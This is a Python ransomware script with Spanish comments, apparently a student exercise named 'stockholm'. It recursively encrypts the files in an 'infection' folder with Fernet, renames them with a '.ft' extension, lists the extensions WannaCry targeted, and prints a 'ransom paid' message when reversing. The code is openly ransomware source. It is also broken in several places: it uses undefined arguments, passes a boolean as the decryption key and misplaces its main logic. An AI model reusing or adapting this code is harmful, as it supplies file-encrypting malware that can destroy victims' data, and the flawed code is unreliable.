print('''
--------------------------------------------------------------------------------------------------------------
==============================================================================================================
                                        S T O C K H O L M                                        by jfrontel
==============================================================================================================
--------------------------------------------------------------------------------------------------------------
''')

from cryptography.fernet import Fernet
import argparse
import os

# __________________________________________  STOCKHOLM: INFO  _____________________________________________ #

'''El programa stockholm_infection_ransomware capaz de cifrar y descifrar ficheros, actuará solo sobre los archivos con las 
extensiones que fueron afectadas por Wannacry. Solo sobre la carpeta infection en el directorio HOME del usuario.
	  : Sin el programa cifra todos los ficheros de la carpeta infection
 	-r: (Vacuna) revierte la infección usando la clave de cifrado.
 	-v: Versión.
 	-s: (Silent), no muestra información por pantalla.
'''

# __________________________________________  VARIABLES GLOBALES _____________________________________________ #
# extensiones usadas por el virus Wannacry

dirpath = './infection/'
version = "stockholm 2.4"
extensiones = ['.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.ARC', '.PAQ', '.accdb', '.aes', '.ai', '.asc',
               '.asf', '.asm', '.asp', '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2', '.c', '.cgm',
               '.class', '.cmd', '.cpp', '.crt', '.csr', '.cs', '.csv', '.db', '.dbf', '.dch', '.der', '.dif', '.dip',
               '.djvu', '.doc', '.docb', '.docm', '.docx', '.dot', '.dotm', '.dotx', '.dwg', '.edb', '.eml', '.fla', '.flv',
               '.frm', '.gif', '.gpg', '.gz', '.h', '.hwp', '.ibd', '.iso', '.jar', '.java', '.jpeg', '.jpg', '.js',
               '.jsp', '.key', '.lay', '.lay6', '.ldf', '.m3u', '.m4u', '.max', '.mdb', '.mdf', '.mid', '.mkv', '.mml',
               '.mov', '.mp3', '.mp4', '.mpeg', '.mpg', '.msg', '.myd', '.myi', '.nef', '.odb', '.odg', '.odp', '.ods',
               '.odt', '.onetoc2', '.ost', '.otg', '.otp', '.ots', '.ott', '.pas', '.pdf', '.pem', '.pfx', '.php', '.pl',
               '.p12', '.png', '.pot', '.potm', '.potx', '.ppam', '.pps', '.ppsm', '.ppsx', '.ppt', '.pptm', '.pptx',
               '.ps1', '.psd', '.pst', '.rar', '.raw', '.rb', '.rtf', '.sch', '.sh', '.sldm', '.sldx', '.slk', '.sln',
               '.snt', '.sql', '.sqlite3', '.sqlitedb', '.stc', '.std', '.sti', '.suo', '.svg', '.swf', '.sxc', '.sxd',
               '.sxi', '.sxm', '.sxw', '.tar', '.tbk', '.tgz', '.tif', '.tiff', '.txt', '.uop', '.uot', '.vb', '.vbs',
               '.vcd', '.vdi', '.vmdk', '.vmx', '.vob', '.vsd', '.vsdx', '.wav', '.wb2', '.wk1', '.wks', '.wma', '.wmv',
               '.xlc', '.xlm', '.xls', '.xlsb', '.xlsm', '.xlsx', '.xlt', '.xltm', '.xltx', '.xlw', '.zip']


# __________________________________________  MENÚ DE ARGUMENTOS  _____________________________________________ #
# ft_get_argument() tomará los argumentos de entrada del programa stockholm

def ft_get_argument():
    flag = argparse.ArgumentParser()
    flag.add_argument("-r", "--reverse", action="store_true", help="(Vacuna) - revierte la infección usando la clave de cifrado.")
    flag.add_argument("-v", "--version", action="store_true", help="Versión")
    flag.add_argument("-s", "--silent", action="store_true", help="No muestra información por pantalla")
    print(flag.parse_args())
    args = flag.parse_args()
    print("\n", "-"*90, f"\n[+] URL analizada: {args.url}\n[+] Carpeta descarga de imagenes: {args.p}\n", "-"*90, "\n")
    return(args)




def encript_file(filename):
	key = open('cif.key', 'rb').read()
	cyphr = Fernet(key)
	try:
		with open(filename, 'rb') as text:
			or_data = text.read()
		enc_data = cyphr.encrypt(or_data)
		with open(filename, 'wb') as enc_file:
			enc_file.write(enc_data)
		os.rename(filename, filename + '.ft')
	except:
		pass
	
 
def unencript_file(name, key):
	if name.endswith('.ft'):
		cyphr = Fernet(key)
		with open(name, 'rb') as text:
			enc_data = text.read()
		or_data = cyphr.decrypt(enc_data)
		with open(name, 'wb') as or_file:
			or_file.write(or_data)
		os.rename(name, name[:len(name)-len('.ft')])



# __________________________________________________  MAIN  _______________________________________________________ #

if __name__ == "__main__":
	args = ft_get_argument()
	if args.genkey:
		my_key = Fernet.generate_key()
		with open('cif.key', 'wb') as keyfile:
			keyfile.write(my_key)
	if args.reverse:
		print("Rescate Pagado, desencriptando archivos...")
	else:
		print("Algo ha salido mal")


def getfiles(dirpath):
	filelist = os.listdir(dirpath)
	for file_n in filelist:
		totalname = dirpath + file_n
		if os.path.isdir(totalname):
			getfiles(totalname + '/')
		if args.reverse:
			unencript_file(totalname, args.reverse)
		else:
			if not os.path.isdir(totalname):
				print(totalname + " has been encripted")
			encript_file(totalname)

getfiles(dirpath)